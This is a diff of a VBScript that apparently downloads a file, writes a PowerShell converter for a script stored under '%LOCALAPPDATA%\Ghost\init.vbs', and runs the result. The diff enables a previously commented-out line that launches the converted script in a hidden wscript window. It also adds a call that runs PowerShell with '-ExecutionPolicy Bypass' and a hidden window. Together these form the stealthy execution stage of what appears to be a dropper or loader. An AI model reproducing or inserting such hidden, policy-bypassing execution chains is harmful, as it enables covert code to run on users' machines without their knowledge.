@@ -23,6 +23,8 @@ If x.Status = 200 Then
     stream.Close
 End If
 
+'========== Creates convert =====================================================================================
+
 Set psFile = fso.CreateTextFile(psPath, True, False)  ' False = ASCII (no BOM)
 
 psFile.WriteLine "$src  = ""$env:LOCALAPPDATA\Ghost\init.vbs"""
@@ -34,6 +36,10 @@ psFile.WriteLine "$utf8NoBom = New-Object System.Text.UTF8Encoding $False"
 psFile.WriteLine "[System.IO.File]::WriteAllText($dest, $content, $utf8NoBom)"
 psFile.WriteLine ""
 psFile.WriteLine "# Optional: Run cleaned script"
-'psFile.WriteLine "Start-Process -WindowStyle Hidden -FilePath ""wscript.exe"" -ArgumentList ""`""$dest`"""""
-
+psFile.WriteLine "Start-Process -WindowStyle Hidden -FilePath ""wscript.exe"" -ArgumentList ""`""$dest`"""""
 psFile.Close
+
+'========== Runs Convert ========================================================================================
+
+WScript.Sleep 2000
+shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & psPath & """", 0, False
